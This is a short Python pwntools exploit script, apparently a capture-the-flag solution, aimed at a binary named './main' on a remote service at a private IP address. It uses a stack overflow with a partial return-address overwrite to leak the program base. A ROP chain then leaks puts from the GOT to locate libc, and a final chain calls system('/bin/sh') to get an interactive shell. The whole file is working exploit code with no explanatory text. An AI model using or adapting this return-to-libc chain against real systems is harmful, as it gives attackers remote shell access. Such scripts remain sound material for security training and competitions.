from pwn import*

context.terminal = ['kitty', '-e']
context.log_level = 'debug'
elf = context.binary = ELF('./main')
p = remote('192.168.100.226', 9093)
#p = process('./main')
#for symbol, address in elf.got.items():
 #   print(f"{symbol}: {hex(address)}")
#p = remote('192.168.100.226', 9092)

payload = b'A' * 0x28 + p16(0x71f6)
#gdb.attach(p)
#pause()
p.send(payload)
p.recvuntil(b'A' * 0x28)
base = p.recvn(0x6)
base = base.ljust(0x8, b'\x00')
base = u64(base)
base = base & 0xfffffffffffff000
base = base - 0x1000
elf.address = base
print(hex(base))

#maps = p.libs()
#with open(f"/proc/{p.proc.pid}/maps", "r") as f:
#        first_line = f.readline().strip()

#base = int(first_line.split('-')[0], 16)
elf.address = base
#print(hex(base))
p.recvuntil(b'plan...')
rdi = 0x1131
rdi = rdi + base
rbp = 0x112e
rbp = rbp + base
puts = 0x11b4
puts = puts + base
putsgot = 0x3fd0
#putsgot = 0x3fe8
putsgot = base + putsgot
ret = 0x11f5
ret = ret + base
payload = p64(elf.sym['vuln']) * 0x5 + p64(rbp) + p64(putsgot) + p64(ret) + p64(puts)
p.send(payload)

#p.recvuntil(b'Processing your plan...')
p.recvline()
leak = p.recvline()
print("found leak: " + str(leak))
leak = leak[:-1]
leak = leak.ljust(0x8, b'\x00')
leak = u64(leak)
print("found puts: " + hex(leak))

libc = ELF('./libc.so.6')
libc.address = leak - libc.sym['puts']
print("libc is at: " + hex(libc.address))
binsh = next(libc.search(b'/bin/sh'))
print("/bin/sh is at: " + hex(binsh))
payload = b'B' * 0x30 + p64(rdi) + p64(binsh) + p64(ret) + p64(libc.sym['system'])
#gdb.attach(p)
#pause()
p.send(payload)
#p.send(b'cat flag.txt')
p.interactive()
